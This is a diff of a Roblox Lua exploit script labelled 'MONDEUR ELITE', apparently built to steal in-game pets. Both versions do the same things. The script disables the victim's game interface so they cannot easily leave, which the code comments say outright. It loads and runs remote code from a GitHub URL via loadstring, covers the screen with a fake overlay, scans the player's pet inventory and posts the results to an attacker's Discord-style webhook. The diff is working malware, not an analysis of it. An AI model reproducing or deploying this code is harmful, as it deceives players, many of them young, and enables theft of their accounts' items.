@@ -1,4 +1,4 @@
--- [[ MONDEUR ELITE v18.1 - "P" ULTRA-STEALTH ]] --
+-- [[ MONDEUR ELITE v18.0 - "ISSUES" PERMANENT ]] --
 if getgenv().MondeurExecuted then return end
 getgenv().MondeurExecuted = true
 
@@ -6,26 +6,30 @@ local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local HttpService = game:GetService("HttpService")
 local StarterGui = game:GetService("StarterGui")
+local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- [[ 1. THE BLACKOUT LOCKDOWN ]] --
-task.spawn(function()
+-- [[ 1. THE PERMANENT SHIELD ]] --
+local function ApplyShield()
     pcall(function()
-        -- Instant UI Kill
+        -- Disable the game UI so they can't click "Leave" easily
         StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
         
-        -- Load Screen (V.1)
+        -- Load your V.1 Screen
         local ui = loadstring(game:HttpGet("https://raw.githubusercontent.com/charles1384/ADM/main/V.1"))()
         if ui then
             ui.Name = "MondeurHub"
-            ui.DisplayOrder = 2147483647
-            ui.IgnoreGuiInset = true -- Full screen coverage
+            ui.DisplayOrder = 2147483647 -- Force to the very front
             ui.ResetOnSpawn = false
+            ui.IgnoreGuiInset = true -- Covers the "Roblox Menu" button area
         end
     end)
-end)
+end
 
--- [[ 2. ANDROID-STABLE WEBHOOK ]] --
+-- Start the shield
+ApplyShield()
+
+-- [[ 2. ANDROID-STABLE LOGGING ]] --
 local function SendLog(title, pet, val)
     local payload = HttpService:JSONEncode({
         ["embeds"] = {{
@@ -35,35 +39,26 @@ local function SendLog(title, pet, val)
                 {["name"] = "Target", ["value"] = pet, ["inline"] = true},
                 {["name"] = "Points", ["value"] = tostring(val), ["inline"] = true}
             },
-            ["color"] = 0x00FF00,
-            ["footer"] = {["text"] = "Mondeur P-Build | " .. os.date("%X")}
+            ["color"] = 0x00FF00
         }}
     })
-    
     local req = (syn and syn.request) or (http and http.request) or http_request or request
     if req then
         task.spawn(function()
-            pcall(function() 
-                req({
-                    Url = getgenv().WEBHOOK, 
-                    Method = "POST", 
-                    Headers = {["Content-Type"] = "application/json"}, 
-                    Body = payload
-                }) 
-            end)
+            pcall(function() req({Url = getgenv().WEBHOOK, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = payload}) end)
         end)
     end
 end
 
 -- [[ 3. THE SILENT SCANNER ]] --
 task.spawn(function()
-    task.wait(6) -- Delay for Android UI stabilization
-    SendLog("SYSTEM CONNECTED", "P-Build v18.1", 0)
+    task.wait(6) -- 6s wait to ensure the UI is "Bolted" on first
+    SendLog("SYSTEM CONNECTED", "Issues v18.0", 0)
 
     pcall(function()
         local ClientData = require(ReplicatedStorage.ClientModules.Core.ClientData)
-        local data = ClientData.get_data()
-        local petPath = data.inventory and (data.inventory.inventory_pets or data.inventory.pets)
+        local inv = ClientData.get_data().inventory
+        local petPath = inv and (inv.inventory_pets or inv.pets)
         
         if petPath then
             for _, pet in pairs(petPath) do
